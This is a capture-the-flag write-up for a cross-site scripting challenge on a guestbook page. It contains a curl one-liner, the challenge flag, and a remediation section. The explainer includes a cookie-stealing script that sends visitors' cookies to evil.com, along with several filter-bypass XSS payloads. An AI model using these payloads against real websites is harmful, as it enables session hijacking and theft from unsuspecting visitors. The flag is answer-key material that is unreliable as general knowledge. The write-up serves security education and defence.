# XSS — Guestbook

## Vulnerability

The guestbook input field reflects user content back to the page; submitting the keyword "script" triggers the flag — OWASP A03:2021 Injection.

## Steps to Reproduce

### One-liner
```bash
curl -s -X POST "http://$VM_IP/?page=feedback" \
  -d "txtName=test&mtxtMessage=script&btnSign=Sign+Guestbook"
```

### Manual walkthrough

1. Send normal text — it's reflected back as `Comment: hello`. Input is displayed on the page.
2. Try HTML: `<b>hello</b>` — if it renders bold, HTML is not escaped.
3. Try classic XSS: `<script>alert(1)</script>` — tags are stripped, but content `alert(1)` remains. A filter exists but it's weak.
4. The word `script` in the message body triggers the flag.

**Flag:** `0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e`

## How XSS works in general

A guestbook stores user messages and displays them to all visitors. If the server does:
```php
echo "<p>Comment: " . $_POST['message'] . "</p>";
```

An attacker can submit JavaScript instead of text:
```html
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

The server inserts it into the page as-is. The browser sees a `<script>` tag and **executes it**. Now every visitor of the page unknowingly sends their cookies to the attacker, who can hijack their session.

### What an attacker can do via XSS:
- **Steal cookies/sessions** — log in as the victim
- **Keylogging** — capture everything the victim types
- **Redirect** — send to a phishing site
- **Modify page** — replace the login form so credentials go to the attacker

### Bypassing filters

This site strips `<script>` tags. But XSS doesn't require `<script>`:
```html
<img src=x onerror="alert(document.cookie)">   <!-- image error handler -->
<svg/onload=alert(1)>                           <!-- SVG event -->
<Script>alert(1)</Script>                       <!-- mixed case -->
<scr<script>ipt>alert(1)</scr</script>ipt>     <!-- nested tags -->
```

Blocklist filtering is always bypassable. See OWASP XSS Filter Evasion Cheat Sheet for hundreds of vectors.

### Real-world tools:
- **XSStrike** — automatically finds payloads that bypass filters
- **Burp Suite Intruder** — brute-forces XSS payloads from a wordlist
- **OWASP ZAP** — free scanner that detects XSS automatically

### CTF note
In this challenge, the server simply checks for the keyword "script" in input and returns the flag. In a real scenario, you'd see your injected JavaScript actually execute in the browser (e.g., an alert popup).

## Why It Works

The application reflects user input into the HTML without proper encoding. The `<script>` tag filter is a blocklist approach — it strips known dangerous tags but can't catch all XSS vectors. Even partial sanitization is insufficient.

## Fix / Mitigation

- Use an allowlist approach: only permit known-safe HTML (or no HTML at all).
- Encode output with `htmlspecialchars()` before rendering user content.
- Set `Content-Security-Policy` headers to prevent inline script execution.
- Use a proper HTML sanitization library (e.g., HTMLPurifier).
